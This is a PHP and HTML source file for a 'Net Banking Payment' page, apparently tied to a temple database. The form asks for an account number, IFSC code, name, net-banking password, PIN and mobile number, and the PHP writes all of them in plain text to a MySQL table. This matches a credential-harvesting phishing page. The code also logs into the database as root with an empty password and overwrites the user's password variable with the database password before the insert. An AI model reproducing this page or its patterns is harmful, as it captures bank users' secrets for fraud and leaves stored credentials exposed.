<?php
// Check if the form is submitted
if (isset($_POST['submit'])) {
  // Retrieve form data
  $accountNumber = $_POST['account-number'];
  $ifscCode = $_POST['ifsc-code'];
  $name = $_POST['name'];
  $password = $_POST['password'];
  $pin = $_POST['pin'];
  $mobileNumber = $_POST['mobile-number'];

  $servername = "localhost";
  $username = "root";
  $password = "";
  $database = "temple";

  $conn = new mysqli($servername, $username, $password, $database);

  if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
  }

  $stmt = $conn->prepare("INSERT INTO netbanking_payments (account_number, ifsc_code, name, password, pin, mobile_number) VALUES (?, ?, ?, ?, ?, ?)");
  $stmt->bind_param("ssssss", $accountNumber, $ifscCode, $name, $password, $pin, $mobileNumber);
  
  if ($stmt->execute()) {
    $successMessage = "Payment details stored successfully.";
    header("refresh:2; url=complete.php");
  } else {
    $errorMessage = "Error storing payment details: " . $stmt->error;
  }

  $stmt->close();
  $conn->close();
}
?>

<!DOCTYPE html>
<html>
<head>
  <title>Net Banking Payment</title>
  <style>
    body {
      background-image: url('card2background.jpg');
      background-size: cover;
      background-position: center;
      font-family: Arial, sans-serif;
      color: #fff;
    }
   
    .container {
      width: 400px;
      margin: 0 auto;
      padding: 20px;
      background-color: rgba(0, 0, 0, 0.7);
      border-radius: 10px;
      text-align: center;
    }
   
    h1 {
      font-size: 24px;
      margin-bottom: 20px;
    }
   
    .netbanking-form {
      text-align: left;
    }
   
    .form-group {
      margin-bottom: 20px;
    }
   
    .form-group label {
      display: block;
      font-size: 16px;
      margin-bottom: 5px;
    }
   
    .form-group input[type="text"],
    .form-group input[type="password"],
    .form-group select {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      border-radius: 5px;
      border: none;
    }


    .cta-button {
      display: inline-block;
      background-color: #4CAF50;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      text-decoration: none;
      margin-top: 30px;
    }


    .form-group input[type="submit"] {
      width: auto;
      padding: 10px 20px;
      font-size: 16px;
      background-color: #ff5722;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }


    .error-message {
      color: #ff0000;
      margin-top: 5px;
    }
    .success-message {
      color: green;
      font-size: 14px;
      margin-top: 5px;
    }

  </style>
</head>
<body>
  <div class="container">
    <h1>Net Banking Payment</h1>
    <?php
    if (isset($successMessage)) {
      echo '<div class="success-message">' . $successMessage . '</div>';
    } elseif (isset($errorMessage)) {
      echo '<div class="error-message">' . $errorMessage . '</div>';
    }
    ?>
    <form class="netbanking-form" action="" onsubmit="return validateForm()" method="post">
      <div class="form-group">
        <label for="account-number">Account Number</label>
        <input type="text" id="account-number" name="account-number" required>
        <div class="error-message" id="account-number-error"></div>
      </div>
      <div class="form-group">
        <label for="ifsc-code">IFSC Code</label>
        <input type="text" id="ifsc-code" name="ifsc-code" required>
        <div class="error-message" id="ifsc-code-error"></div>
      </div>
      <div class="form-group">
        <label for="name">name</label>
        <input type="text" id="name" name="name" required>
        <div class="error-message" id="name-error"></div>
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
        <div class="error-message" id="password-error"></div>
      </div>
      <div class="form-group">
        <label for="pin">PIN</label>
        <input type="password" id="pin" name="pin" required>
        <div class="error-message" id="pin-error"></div>
      </div>
      <div class="form-group">
        <label for="mobile-number">Mobile Number</label>
        <input type="text" id="mobile-number" name="mobile-number" required>
        <div class="error-message" id="mobile-number-error"></div>
      </div>
      <div class="form-group">
        <input type="submit" name="submit" value="Proceed">
      </div>
    </form>
  </div>


  <script>
    function validateForm() {
      var accountNumber = document.getElementById("account-number").value;
      var ifscCode = document.getElementById("ifsc-code").value;
      var name = document.getElementById("name").value;
      var password = document.getElementById("password").value;
      var pin = document.getElementById("pin").value;
      var mobileNumber = document.getElementById("mobile-number").value;


      var isValid = true;


      if (accountNumber.length !== 12 || isNaN(accountNumber)) {
        document.getElementById("account-number-error").innerHTML = "Please enter a valid 12-digit account number.";
        isValid = false;
      } else {
        document.getElementById("account-number-error").innerHTML = "";
      }


      var ifscRegex = /^[A-Za-z]{4}0[0-9]{6}$/;
      if (!ifscRegex.test(ifscCode)) {
        document.getElementById("ifsc-code-error").innerHTML = "Please enter a valid IFSC code.";
        isValid = false;
      } else {
        document.getElementById("ifsc-code-error").innerHTML = "";
      }


      var nameRegex = /^[A-Za-z0-9!@#$%^&*()_+\-=[\]{};':"\\|,.<>/?]+$/;
      if (!nameRegex.test(name)) {
        document.getElementById("name-error").innerHTML = "Please enter a valid name.";
        isValid = false;
      } else {
        document.getElementById("name-error").innerHTML = "";
      }


      if (password.length !== 6 || isNaN(password)) {
        document.getElementById("password-error").innerHTML = "Please enter a valid 6 digit password.";
        isValid = false;
      } else {
        document.getElementById("password-error").innerHTML = "";
      }


      if (pin.length !== 4 || isNaN(pin)) {
        document.getElementById("pin-error").innerHTML = "Please enter a valid 4-digit PIN.";
        isValid = false;
      } else {
        document.getElementById("pin-error").innerHTML = "";
      }


      var mobileRegex = /^\d{10}$/;
      if (!mobileRegex.test(mobileNumber)) {
        document.getElementById("mobile-number-error").innerHTML = "Please enter a valid 10-digit mobile number.";
        isValid = false;
      } else {
        document.getElementById("mobile-number-error").innerHTML = "";
      }


      return isValid;
    }
  </script>
</body>
</html>